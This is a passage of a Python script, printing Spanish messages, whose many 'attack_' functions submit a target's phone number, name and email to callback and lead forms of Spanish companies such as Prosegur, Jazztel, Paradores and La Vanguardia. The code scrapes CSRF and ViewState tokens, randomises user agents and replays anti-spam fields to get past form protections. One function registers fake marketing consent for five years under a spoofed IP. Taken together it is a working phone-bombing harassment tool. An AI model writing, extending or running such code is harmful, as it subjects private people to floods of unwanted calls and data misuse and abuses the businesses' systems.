            "Origin": "https://www.integraenergia.es"
        })

        # Step 1: GET to extract token
        resp = session.get("https://www.integraenergia.es/contrata-ahora", timeout=10)
        
        token = ""
        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
        if token_match:
            token = token_match.group(1)
            
        if not token:
            print(Fore.YELLOW + "Integra: No se pudo extraer token" + Style.RESET_ALL)
            return

        # Step 2: POST
        url_post = "https://www.integraenergia.es/contacts/send_callme_inner"
        payload = {
            "utf8": "✓",
            "authenticity_token": token,
            "callme_form[phone]": number,
            "callme_form[name]": name,
            "callme_form[timeslot]": "Ahora mismo",
            "callme_form[conditions]": "on",
            "callme_form[page]": "contrata-ahora",
            "button": ""
        }
        
        res = session.post(url_post, data=payload, timeout=10)
        
        if res.status_code == 200 or res.status_code == 302:
             print(Fore.GREEN + "Integra: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Integra: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Integra: Error {e}" + Style.RESET_ALL)

def attack_nadunet(number, name):
    try:
        url = "https://nadunet.es/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://nadunet.es/llamadme/",
            "Origin": "https://nadunet.es"
        }
        
        # Elementor Pro Form Multipart
        files = {
            'post_id': (None, '152'),
            'form_id': (None, '70b23488'),
            'referer_title': (None, 'nadunet | ¡Llamadme!'),
            'queried_id': (None, '152'),
            'form_fields[nombre]': (None, name),
            'form_fields[telefono]': (None, number),
            'form_fields[motivo]': (None, 'Elige una opción'),
            'form_fields[field_f1aeb31]': (None, 'nc'),
            'form_fields[verificacion_terminoscondiciones]': (None, 'Marcando esta casilla aceptas los Términos y Condiciones de Uso y Privacidad y confirmas que eres mayor de 18 años. Consulta nuestra web para leer nuestros términos y condiciones.'),
            'g-recaptcha-response': (None, 'NO_SOLVER_BEST_EFFORT'),
            'action': (None, 'elementor_pro_forms_send_form'),
            'referrer': (None, 'https://nadunet.es/llamadme/')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Nadunet: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Nadunet: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Nadunet: Error {e}" + Style.RESET_ALL)

def attack_premaat(number, name):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.premaat.es/te-llamamos",
            "Origin": "https://www.premaat.es"
        })

        # Step 1: GET to extract ASP.NET hidden fields
        resp = session.get("https://www.premaat.es/te-llamamos", timeout=10)
        
        viewstate = ""
        eventvalidation = ""
        viewstategenerator = ""
        
        vs_match = re.search(r'id="__VIEWSTATE" value="([^"]+)"', resp.text)
        if vs_match: viewstate = vs_match.group(1)
        
        ev_match = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', resp.text)
        if ev_match: eventvalidation = ev_match.group(1)

        vsg_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', resp.text)
        if vsg_match: viewstategenerator = vsg_match.group(1)

        if not viewstate or not eventvalidation:
            print(Fore.YELLOW + "Premaat: No se pudieron extraer campos ASP.NET" + Style.RESET_ALL)
            return

        # Step 2: POST
        url_post = "https://www.premaat.es/te-llamamos"
        
        # Current date/time for the form (optional but good for realism)
        import datetime
        now = datetime.datetime.now()
        date_str = now.strftime("%d/%m/%Y 0:00:00") # 22/12/2025 0:00:00
        time_str = now.strftime("%H:%M") # 10:45
        
        payload = {
            "__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__LASTFOCUS": "",
            "__VIEWSTATE": viewstate,
            "__VIEWSTATEGENERATOR": viewstategenerator,
            "__EVENTVALIDATION": eventvalidation,
            "ctl00$ctl00$SCM_Main": "ctl00$ctl00$UDP_Content|ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$btnLlamar",
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$txtNombre": name,
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$txtTelefono": number,
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$cmbFecha": date_str,
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$cmbHoras": time_str,
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$chkAcepto": "on",
            "ctl00$ctl00$ContentPlaceHolder1$ContentPlaceHolder1$embCTC$btnLlamar": "TE LLAMAMOS",
            "__ASYNCPOST": "true"
        }
        
        res = session.post(url_post, data=payload, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Premaat: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Premaat: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Premaat: Error {e}" + Style.RESET_ALL)

def attack_lavanguardia(number, name):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://shopping.lavanguardia.com/callmeback/index/view/locale/es_ES",
            "Origin": "https://shopping.lavanguardia.com",
            "X-Requested-With": "XMLHttpRequest"
        })

        # Step 1: GET to init session (frontend cookie)
        session.get("https://shopping.lavanguardia.com/callmeback/index/view/locale/es_ES", timeout=10)
        
        # Step 2: POST
        url_post = "https://shopping.lavanguardia.com/callmeback/index/send/"
        
        import time
        payload = {
            "momento_llamada": str(int(time.time())),
            "hora_llamada": "1",
            "preguntar_por": name,
            "telefono": number,
            "idioma": "es_ES",
            "origen_web": "",
            "origen_web_txt": "",
            "locale": "es_ES"
        }
        
        res = session.post(url_post, data=payload, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "La Vanguardia: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"La Vanguardia: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"La Vanguardia: Error {e}" + Style.RESET_ALL)

def attack_populoos(number):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.populoos.es/",
            "Origin": "https://www.populoos.es"
        })

        # Step 1: GET to extract hidden fields (obfuscated names)
        resp = session.get("https://www.populoos.es/", timeout=10)
        
        # Generic extraction of all input fields
        payload = {}
        inputs = re.findall(r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"', resp.text)
        for name, value in inputs:
            payload[name] = value
            
        # Add/Override specific fields
        payload.update({
            "origin": "solicita-llamada",
            "ya_cliente": "N",
            "email": "",
            "telefono": number
        })
        
        # Step 2: POST
        url_post = "https://www.populoos.es/es/contact-action/"
        
        # We need to handle potential redirects (302) by allowing redirects
        res = session.post(url_post, data=payload, allow_redirects=True, timeout=15)
        
        # Check success based on redirection URL or content
        if res.status_code == 200 and "gracias" in res.url:
             print(Fore.GREEN + "Populoos: Enviado" + Style.RESET_ALL)
        elif res.status_code == 200:
             # Sometimes it returns 200 on the POST response directly if no redirect?
             # Or if it fails silent. We assume sent if 200 and no obvious error.
             print(Fore.GREEN + "Populoos: Enviado (Probable)" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Populoos: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Populoos: Error {e}" + Style.RESET_ALL)

def attack_silbo(number, name, surname):
    try:
        url = "https://apisilbo.recogn-ai.com/api/v1/customer/contact"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/json",
            "Referer": "https://silbotelecom.com/",
            "Origin": "https://silbotelecom.com"
        }
        
        payload = {
            "fullname": f"{name} {surname}",
            "postal_code": "28013",
            "phone": number
        }
        
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Silbo Telecom: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Silbo Telecom: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Silbo Telecom: Error {e}" + Style.RESET_ALL)

def attack_telecomunicaciones_guay(number, name, surname):
    try:
        url = "https://telecomunicacionesguay.com/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
            "Referer": "https://telecomunicacionesguay.com/formulario-simple-te-llamamos",
            "Origin": "https://telecomunicacionesguay.com",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        # WPForms multipart
        files = {
            'wpforms[fields][0][first]': (None, name),
            'wpforms[fields][0][last]': (None, surname),
            'wpforms[fields][3]': (None, '+34' + number),
            'wpforms[fields][5]': (None, 'Tarifas sólo Móvil'),
            'wpforms[fields][4][]': (None, '1'),
            'wpforms[hp]': (None, ''),
            'wpforms[id]': (None, '1192'),
            'wpforms[author]': (None, '1'),
            'wpforms[post_id]': (None, '1168'),
            'wpforms[submit]': (None, 'wpforms-submit'),
            'action': (None, 'wpforms_submit'),
            'page_url': (None, 'https://telecomunicacionesguay.com/formulario-simple-te-llamamos')
        }

        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             # Check JSON success
             if '"success":true' in res.text or 'correctamente' in res.text:
                 print(Fore.GREEN + "Telecomunicaciones Guay: Enviado" + Style.RESET_ALL)
             else:
                 print(Fore.GREEN + "Telecomunicaciones Guay: Enviado (Posible)" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Telecomunicaciones Guay: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Telecomunicaciones Guay: Error {e}" + Style.RESET_ALL)

def attack_eni_plenitude(number):
    try:
        url = "https://hooks.zapier.com/hooks/catch/13049102/3yxp07j/"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://eniplenitude.es/",
            "Origin": "https://eniplenitude.es"
        }
        
        payload = {
            "URL": "https://eniplenitude.es/hogar/tarifas-luz/#",
            "nomeTracciamenti": "",
            "nomeForm": "",
            "url_chiamante": "",
            "invio_mail": "N",
            "partner": "SPAIN",
            "campaign": "",
            "ga": "",
            "telefono": number,
            "source": "",
            "medium": ""
        }
        
        res = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if res.status_code == 200:
             if '"status": "success"' in res.text or '"status":"success"' in res.text:
                 print(Fore.GREEN + "Eni Plenitude: Enviado" + Style.RESET_ALL)
             else:
                 print(Fore.GREEN + "Eni Plenitude: Enviado (Posible)" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Eni Plenitude: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Eni Plenitude: Error {e}" + Style.RESET_ALL)

def attack_obligado_cumplimiento(number, name):
    try:
        url = "https://www.obligadocumplimiento.org/_dm/s/rt/api/public/rt/site/5e7aab938ded401ab03a4630ae3bb3c0/contactForm?hiddenCaptcha=false&sendTracking=true"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://www.obligadocumplimiento.org/contrata-ahora",
            "Origin": "https://www.obligadocumplimiento.org"
        }
        
        # Hardcoded ID params from request dump
        data = {
            "dmform-00": name,
            "label-dmform-00": "Nombre",
            "dmform-01": number,
            "label-dmform-01": "Teléfono",
            "dmformsendto": "O0wrseIfFLsSlLR4GAldF6yr++kQ+C76ayrfSgJGMdbXLXCCmJp12ZyIZeMvaxV6Ytks2+SVA+nJ2FxSnXZlkxQi5mZSs5x9/9omfnF4wi6PlEBPwfNiV7i3L1G6bAFA",
            "action": "/_dm/s/rt/widgets/dmform.submit.jsp",
            "dmformsubject": "Solicitud para formalizar Contrato a través Web",
            "dmformsubmitparams": "8mpKnCSiNQXK/d9M7IDrSzRkXjNcoSR4cphHUS56qbcRmeQN1bvL7Kexh4xa4YU5r/AIIteZvywB/kwj3dese9/ulCo7xCaKQqWXif7Q18+9vC+QSQ7V7RVjbV/xtITSTBeR+xkkCOBHLyfYcpu7e+hMq8eRbGDz7aNRgUOy1aU0hZHQCzsXY+Yk2oAlwGC4/9AprZnOXh4ngdOJaBGsqOOk+vW/FB5M2l7bbXKB8NkHwkP6o+SaUKuVfRAFKg6DI/WcTry9sHJx+8goeq/f9t21rE+fdr6pltmLfunpTfo3iWsgd+GKkQ==",
            "page_uuid": "81c8a52f589f4b2789c594a054b3f4d3",
            "form_id": "1699224539",
            "form_title": "",
            "type-dmform-00": "text",
            "type-dmform-01": "text",
            "device_code": "mobile"
        }
        
        res = requests.post(url, data=data, headers=headers, timeout=10)
        
        # 204 No Content is standard success for this API
        if res.status_code == 204 or res.status_code == 200:
             print(Fore.GREEN + "Obligado Cumplimiento: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Obligado Cumplimiento: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Obligado Cumplimiento: Error {e}" + Style.RESET_ALL)

def attack_movistar_prosegur(number):
    try:
        session = requests.Session()
        session.headers.update({
             "User-Agent": get_random_user_agent(),
             "Referer": "https://movistarproseguralarmas.es/",
             "Origin": "https://movistarproseguralarmas.es"
        })
        
        # Step 1: GET to extract UUID
        resp = session.get("https://movistarproseguralarmas.es/", timeout=10)
        
        uuid = ""
        # Search for mgnlModelExecutionUUID in input fields
        uuid_match = re.search(r'name="mgnlModelExecutionUUID" value="([^"]+)"', resp.text)
        if uuid_match:
            uuid = uuid_match.group(1)
            
        if not uuid:
            # Fallback (sometimes it's in a JS var or different structure, or we can try a hardcoded one if it fails)
            # For now, let's try to proceed or log warning. 
            # The request dump showed "4d8dc6bc-c955-4921-bbf5-adbaefdef1f6", might be dynamic per session.
            pass

        # Step 2: POST
        url_post = "https://movistarproseguralarmas.es/"
        
        # Multipart fields
        files = {
            'mgnlModelExecutionUUID': (None, uuid),
            'csrf': (None, ''), # Often empty in the dump
            'containerUuid': (None, ''),
            'urlFormulario': (None, 'https://movistarproseguralarmas.es/'),
            'client_id_ga': (None, ''),
            'gender': (None, ''),
            'phone': (None, number),
            'psgSession_variables': (None, ''),
            'dp_politica-privacidad': (None, 'true')
        }
        
        # We need to act like a form submit. 
        # The dump shows it posts to root /
        res = session.post(url_post, files=files, timeout=10)
        
        if res.status_code == 302 or res.status_code == 200:
             print(Fore.GREEN + "Movistar Prosegur: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Movistar Prosegur: Falló ({res.status_code})" + Style.RESET_ALL)
             
    except Exception as e:
         print(Fore.RED + f"Movistar Prosegur: Error {e}" + Style.RESET_ALL)

def attack_sofrologia(number, email):
    try:
        url = "https://www.sofrologia.com/wp-json/contact-form-7/v1/contact-forms/25756/feedback"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.sofrologia.com/te-llamamos-gratis-ahora/",
            "Origin": "https://www.sofrologia.com"
        }
        
        # Multipart form data
        # _wpcf7_recaptcha_response is likely expired or tied to the session/IP, but we'll include a placeholder or try without if it fails mentally.
        # The dump shows specific anti-spam fields (_wpcf7_ak_*) which are very specific. We include them hardcoded as a "best effort" replay.
        files = {
            '_wpcf7': (None, '25756'),
            '_wpcf7_version': (None, '6.1.4'),
            '_wpcf7_locale': (None, 'es_ES'),
            '_wpcf7_unit_tag': (None, 'wpcf7-f25756-p2852-o1'),
            '_wpcf7_container_post': (None, '2852'),
            '_wpcf7_posted_data_hash': (None, ''),
            '_wpcf7_recaptcha_response': (None, 'NO_SOLVER_BEST_EFFORT'), 
            'your-name': (None, number), # Mapped as per user request
            'your-email': (None, email),
            'your-subject': (None, 'CONSULTAR INFO'),
            'your-message': (None, 'Estoy interesado en informacion.'),
            '_wpcf7_ak_hp_textarea': (None, ''),
            '_wpcf7_ak_js': (None, '1766244124696'),
            '_wpcf7_ak_bib': (None, '1766244143215'),
            '_wpcf7_ak_bfs': (None, '1766244184851'),
            '_wpcf7_ak_bkpc': (None, '82'),
            '_wpcf7_ak_bkp': (None, '72;79,87;97,26;72,87;72;69,108;96,36;71,79;79,132;96,0;81,433;265,301;265,0;98,150;86,9;134,55;89,72;63,114;80,88;80,353;79,63;36,0;71;132,36;90,105;27,69;97,150;88,18;71,10;81,106;106,8;123,142;71,99;71,0;91,68;107,55;52,27;71,1;107;57,768;90,178;133,71;114,96;72,123;78,79;45,298;36,183;36,229;45,78;70,34;78,54;87,150;54,0;79,178;57,95;105,99;96,69;78,17;97,28;99,88;86,82;90,124;159,36;106,78;71,1;44,162;97,53;70,62;45,81;87,70;88,44;81,36;78,18;71,61;75,43;98,16;78,80;140,61;160,17;98,80;53,1032;27,293;'),
            '_wpcf7_ak_bmc': (None, '104;41,1883;1,2512;3,25333;2,308;3,3826;1,12870;'),
            '_wpcf7_ak_bmcc': (None, '7'),
            '_wpcf7_ak_bmk': (None, '38;48;49'),
            '_wpcf7_ak_bck': (None, '25;25;39;39;39;39;39;39;39;48;48;48;80'),
            '_wpcf7_ak_bmmc': (None, '12'),
            '_wpcf7_ak_btmc': (None, '1'),
            '_wpcf7_ak_bsc': (None, '5'),
            '_wpcf7_ak_bte': (None, '55;399,24626;56,253;84,228;69,3758;75,12798;'),
            '_wpcf7_ak_btec': (None, '6'),
            '_wpcf7_ak_bmm': (None, '680,110;1665,68;259,39;27,1;31,1;72,3;56,4;206,4;816,447;697,81;282,297;322,28;')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Sofrologia: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Sofrologia: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Sofrologia: Error {e}" + Style.RESET_ALL)

def attack_jazztel_adslhouse(number):
    try:
        url = "https://enrutador.corp.adslhouse.com/consentimientos"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.mijazztel.com/",
            "Origin": "https://www.mijazztel.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        
        # Determine timestamps for the payload
        from datetime import datetime
        now = datetime.now()
        start_date = now.strftime("%Y-%m-%d %H:%M") # 2025-12-20 16:24
        end_date = now.replace(year=now.year + 5).strftime("%Y-%m-%d %H:%M") # 2030-12-20 16:24
        
        payload = {
            "telefono": number,
            "target": "adsl_telco,adsl_energia,adsl_finanzas",
            "user_ip": "88.6.235.155", # Using a sample valid IP as per request
            "audiencia": "65e58f80f6d42dea45006cc6", 
            "fecha_inicio_cons": start_date,
            "fecha_fin_cons": end_date,
            "url": "www.mijazztel.com"
        }
        
        res = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Jazztel (ADSLHouse): Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Jazztel (ADSLHouse): Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Jazztel (ADSLHouse): Error {e}" + Style.RESET_ALL)

def attack_arvitelco(number, name, surname, email):
    try:
        url = "https://arvitelco.es/telefonia/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://arvitelco.es/telefonia/te-llamamos/",
            "Origin": "https://arvitelco.es"
        }
        
        # Elementor Pro Form
        files = {
            'post_id': (None, '650'),
            'form_id': (None, '21ce84d'),
            'referer_title': (None, 'Si quieres, te llamamos | Telefonía móvil en Sevilla'),
            'queried_id': (None, '650'),
            'form_fields[nombre]': (None, name),
            'form_fields[field_62ef1ce]': (None, surname),
            'form_fields[telef]': (None, number),
            'form_fields[field_c1511ad]': (None, email),
            'form_fields[field_3ce0738]': (None, 'movil'),
            'form_fields[field_bac03f5]': (None, ''),
            'action': (None, 'elementor_pro_forms_send_form'),
            'referrer': (None, 'https://arvitelco.es/telefonia/te-llamamos/')
        }
        
        res = requests.post(url, files=files, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Arvitelco: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Arvitelco: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Arvitelco: Error {e}" + Style.RESET_ALL)

def attack_mutualmed(number, name):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Referer": "https://www.mutualmed.es/es/llamar-seguro-mutualmed-para-medicos",
            "Origin": "https://www.mutualmed.es"
        })
        
        # Step 1: GET to extract ViewState
        resp = session.get("https://www.mutualmed.es/es/llamar-seguro-mutualmed-para-medicos", timeout=10)
        
        viewstate = ""
        eventvalidation = ""
        viewstategenerator = ""
        
        vs_match = re.search(r'id="__VIEWSTATE" value="([^"]+)"', resp.text)
        if vs_match: viewstate = vs_match.group(1)
        
        ev_match = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', resp.text)
        if ev_match: eventvalidation = ev_match.group(1)

        vsg_match = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', resp.text)
        if vsg_match: viewstategenerator = vsg_match.group(1)
        
        if not viewstate or not eventvalidation:
             # Try fallback or just continue, but it likely won't work
             pass

        # Step 2: POST (Multipart)
        url_post = "https://www.mutualmed.es/es/llamar-seguro-mutualmed-para-medicos"
        
        files = {
            '__EVENTTARGET': (None, ''),
            '__EVENTARGUMENT': (None, ''),
            '__VIEWSTATE': (None, viewstate),
            '__VIEWSTATEGENERATOR': (None, viewstategenerator),
            '__EVENTVALIDATION': (None, eventvalidation),
            'ctl00$cosMain$TipoFormulariohf': (None, 'CallMeNow'),
            'Nombre': (None, name),
            'Telefono': (None, number),
            'CheckLopd': (None, '1'),
            'ctl00$cosMain$btnENviar': (None, 'Enviar')
        }
        
        res = session.post(url_post, files=files, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "MutualMed: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"MutualMed: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"MutualMed: Error {e}" + Style.RESET_ALL)

def attack_paradores(number, name):
    try:
        url = "https://c2c.bpo.madisonmk.com/paradores/servicios/send_call"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://paradores.es/",
            "Origin": "https://paradores.es",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        
        # Hardcoded token from dump
        data = {
            'token': 'JubfV7pEqXTwbMhvKbRBTE3bnzJuZQqG',
            'name': name,
            'phone': f"0034{number}", # Dump shows 00034 or 0034. Standardizing on 0034.
            'country': 'Spain'
        }
        
        res = requests.post(url, data=data, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Paradores: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Paradores: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Paradores: Error {e}" + Style.RESET_ALL)

def attack_buala(number, name, surname):
    try:
        url = "https://crm.zoho.eu/crm/WebToLeadForm"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://buala.es/",
            "Origin": "https://buala.es",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        
        # Parameters from dump
        data = {
            'xnQsjsdp': '676ad188b976184fca5010da8f2de7b2a781c7a202b5550fa3428e1574cf184b',
            'xmIwtLD': 'c372704f0444e1e01a83ae0d16a3587562d5bf7f123089578f54c870ce5d9ef0f93362f03c8911d47433de5aa37c3fad',
            'actionType': 'TGVhZHM=',
            'returnURL': 'null',
            'Phone': number,
            'First Name': name,
            'Last Name': surname,
            'Lead Source': 'Formulario web_te llamamos',
            'privacyTool': 'on',
            'zc_gad': 'undefined'
        }
        
        res = requests.post(url, data=data, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "Buala: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Buala: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"Buala: Error {e}" + Style.RESET_ALL)

def attack_amg_telecomunicaciones(number):
    try:
        url = "https://amgtelecomunicaciones.es/gracias-te-llamamos-gratis/"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://amgtelecomunicaciones.es/gracias-te-llamamos-gratis/",
            "Origin": "https://amgtelecomunicaciones.es"
        }
        
        # Simple GET request with param
        params = {
            'phone': number
        }
        
        res = requests.get(url, params=params, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "AMG Telecomunicaciones: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"AMG Telecomunicaciones: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"AMG Telecomunicaciones: Error {e}" + Style.RESET_ALL)

def attack_llamame_gratis(number):
    try:
        # The URL contains a JSON object that is URL encoded.
        # {"idUrl":"6946c21bd3012fbce09d09c3","idObject":"1517","token":"1766244891373-88.6.235.155-39334","_idObj":"6946c21bd3012fbce09d09c5"}
        url = "https://app.webphone.net/form/%7B%22idUrl%22%3A%226946c21bd3012fbce09d09c3%22%2C%22idObject%22%3A%221517%22%2C%22token%22%3A%221766244891373-88.6.235.155-39334%22%2C%22_idObj%22%3A%226946c21bd3012fbce09d09c5%22%7D"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://llamamegratis.es/",
            "Origin": "https://llamamegratis.es",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        
        import time
        timestamp = int(time.time() * 1000)
        
        data = {
            'cliTime': str(timestamp),
            'voiceMail': '0',
            'name': '',
            'phoneNumber': number,
            'idObj': '1517',
            'idUrl': '6946c21bd3012fbce09d09c3',
            'token': '1766244891373-88.6.235.155-39334', # Hardcoded
            'krid': 'undefined',
            '_idObj': '6946c21bd3012fbce09d09c5',
            'cmd': 'call',
            'prefix': '0034',
            'email': '',
            'message': ''
        }
        
        res = requests.post(url, data=data, headers=headers, timeout=10)
        
        if res.status_code == 200:
             print(Fore.GREEN + "LlamameGratis: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"LlamameGratis: Falló ({res.status_code})" + Style.RESET_ALL)
    except Exception as e:
         print(Fore.RED + f"LlamameGratis: Error {e}" + Style.RESET_ALL)

def attack_prosegur(number):
    try:
        session = requests.Session()
        session.headers.update({
             "User-Agent": get_random_user_agent(),
             "Referer": "https://www.prosegur.es/",
             "Origin": "https://www.prosegur.es"
        })
        
        # Step 1: GET to extract UUID
        try:
            resp = session.get("https://www.prosegur.es/", timeout=10)
            uuid_match = re.search(r'name="mgnlModelExecutionUUID" value="([^"]+)"', resp.text)
            uuid = uuid_match.group(1) if uuid_match else ""
        except:
            uuid = ""

        # Step 2: POST
        url_post = "https://www.prosegur.es/"
        
        # Multipart fields using list of tuples for duplicate keys support
        files = [
            ('mgnlModelExecutionUUID', (None, uuid)),
            ('csrf', (None, '')),
            ('containerUuid', (None, '')),
            ('urlFormulario', (None, 'https://www.prosegur.es/')),
            ('client_id_ga', (None, '')),
            ('url', (None, '')),
            ('phone', (None, number)),
            ('psgSession_variables', (None, '')),
            ('dp_politica-privacidad', (None, '0')),
            ('dp_politica-privacidad', (None, '1'))
        ]
        
        # We act like a form submit. 
        res = session.post(url_post, files=files, timeout=10)
        
        if res.status_code == 302 or res.status_code == 200:
             print(Fore.GREEN + "Prosegur: Enviado" + Style.RESET_ALL)
        else:
             print(Fore.YELLOW + f"Prosegur: Falló ({res.status_code})" + Style.RESET_ALL)
             
    except Exception as e:
         print(Fore.RED + f"Prosegur: Error {e}" + Style.RESET_ALL)

def attack_soybiti(number, name, email):
    try:
        url = "https://soybiti.es/wp-json/contact-form-7/v1/contact-forms/11557/feedback"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Referer": "https://soybiti.es/te-llamamos/",
            "Origin": "https://soybiti.es",
            # Content-Type is multipart/form-data, requests handles boundary automatically if we use files= or data= carefully, 
            # but usually for multipart with requests we use 'files' for the complex fields.
        }
        
        # Using 'files' for multipart/form-data submission is the standard way in requests
        files = {
            '_wpcf7': (None, '11557'),
            '_wpcf7_version': (None, '5.4.1'),
            '_wpcf7_locale': (None, 'en_US'),
            '_wpcf7_unit_tag': (None, 'wpcf7-f11557-p11555-o2'),
            '_wpcf7_container_post': (None, '11555'),
            '_wpcf7_posted_data_hash': (None, ''),
